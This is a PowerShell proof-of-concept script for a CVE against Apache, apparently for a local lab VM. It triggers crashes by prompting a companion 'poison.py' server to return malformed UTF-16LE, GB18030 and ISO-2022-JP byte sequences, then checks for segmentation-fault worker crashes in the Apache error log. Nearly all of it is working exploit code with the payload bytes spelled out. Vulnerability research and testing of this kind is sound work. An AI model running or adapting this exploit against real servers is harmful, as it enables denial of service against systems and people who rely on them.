# ============================================================
# CVE-2026-63686 — Proof of Concept Trigger Script
# ============================================================
# Run this on the Windows host AFTER:
#   1. The target VM (Apache) is running at 192.168.56.10
#   2. poison.py is running on this host (python attacker/poison.py)
#
# Usage:
#   .\poc.ps1
#   .\poc.ps1 -TargetIP 192.168.56.10
# ============================================================

param(
    [string]$TargetIP = "localhost:8080"
)

$divider = "=" * 60

Write-Host $divider
Write-Host "  CVE-2026-63686 — Proof of Concept"
Write-Host $divider
Write-Host ""
Write-Host "  Target: http://${TargetIP}"
Write-Host ""

# ── Check connectivity ─────────────────────────────────────
Write-Host "[*] Testing connectivity to ${TargetIP}..." -ForegroundColor Cyan
try {
    $test = Invoke-WebRequest -Uri "http://${TargetIP}/safe" -UseBasicParsing -TimeoutSec 3 -ErrorAction Stop
    Write-Host "[+] Target is reachable." -ForegroundColor Green
} catch {
    Write-Host "[!] Target may not be ready yet — continuing anyway..." -ForegroundColor Yellow
}
Write-Host ""

# ── Baseline test ──────────────────────────────────────────
Write-Host $divider
Write-Host "  Test 0: Baseline (safe response)" -ForegroundColor Yellow
Write-Host $divider
Write-Host "[*] Sending:  curl http://${TargetIP}/safe"
try {
    $response = Invoke-WebRequest -Uri "http://${TargetIP}/safe" -UseBasicParsing -TimeoutSec 5
    Write-Host "[+] Response: $($response.StatusCode) — $($response.Content.Substring(0, [Math]::Min(80, $response.Content.Length)))..." -ForegroundColor Green
} catch {
    Write-Host "[!] Request failed (this is expected if poison.py serves /safe normally)" -ForegroundColor Yellow
}
Write-Host ""

# ── Payload 1: UTF-16LE ───────────────────────────────────
Write-Host $divider
Write-Host "  Test 1: UTF-16LE orphan byte" -ForegroundColor Red
Write-Host $divider
Write-Host "[*] Sending:  curl http://${TargetIP}/"
Write-Host "    Charset:  UTF-16LE"
Write-Host "    Payload:  \x3c\x00\x3e\x00\x41 (5 bytes — odd count breaks UTF-16 pairs)"
try {
    $response = Invoke-WebRequest -Uri "http://${TargetIP}/" -UseBasicParsing -TimeoutSec 10
    Write-Host "[?] Got response $($response.StatusCode) — server may not have crashed" -ForegroundColor Yellow
} catch {
    Write-Host "[+] Connection error — Apache worker likely crashed (SIGSEGV)" -ForegroundColor Green
}
Write-Host ""
Start-Sleep -Seconds 2  # Give Apache time to log the crash and spawn a new worker

# ── Payload 2: GB18030 ────────────────────────────────────
Write-Host $divider
Write-Host "  Test 2: GB18030 incomplete multi-byte" -ForegroundColor Red
Write-Host $divider
Write-Host "[*] Sending:  curl http://${TargetIP}/gb18030"
Write-Host "    Charset:  GB18030"
Write-Host "    Payload:  \x81\x40\x41 (lead byte 0x81 expects a valid trail byte)"
try {
    $response = Invoke-WebRequest -Uri "http://${TargetIP}/gb18030" -UseBasicParsing -TimeoutSec 10
    Write-Host "[?] Got response $($response.StatusCode) — server may not have crashed" -ForegroundColor Yellow
} catch {
    Write-Host "[+] Connection error — Apache worker likely crashed (SIGSEGV)" -ForegroundColor Green
}
Write-Host ""
Start-Sleep -Seconds 2

# ── Payload 3: ISO-2022-JP ────────────────────────────────
Write-Host $divider
Write-Host "  Test 3: ISO-2022-JP dangling escape" -ForegroundColor Red
Write-Host $divider
Write-Host "[*] Sending:  curl http://${TargetIP}/iso2022"
Write-Host "    Charset:  ISO-2022-JP"
Write-Host "    Payload:  \x1b\x24\x42\x41\x41\x42 (escape enters 2-byte mode, sequence truncated)"
try {
    $response = Invoke-WebRequest -Uri "http://${TargetIP}/iso2022" -UseBasicParsing -TimeoutSec 10
    Write-Host "[?] Got response $($response.StatusCode) — server may not have crashed" -ForegroundColor Yellow
} catch {
    Write-Host "[+] Connection error — Apache worker likely crashed (SIGSEGV)" -ForegroundColor Green
}
Write-Host ""

# ── Summary ────────────────────────────────────────────────
Write-Host $divider
Write-Host "  PoC Complete" -ForegroundColor Cyan
Write-Host $divider
Write-Host ""
Write-Host "  Now SSH into the target VM and check the Apache error log:"
Write-Host ""
Write-Host "    ssh user@${TargetIP}" -ForegroundColor Yellow
Write-Host "    sudo tail -20 /var/log/apache2/error.log" -ForegroundColor Yellow
Write-Host ""
Write-Host "  Look for lines containing:"
Write-Host '    "AH00051: child pid ... exit signal Segmentation fault (11)"' -ForegroundColor Red
Write-Host ""
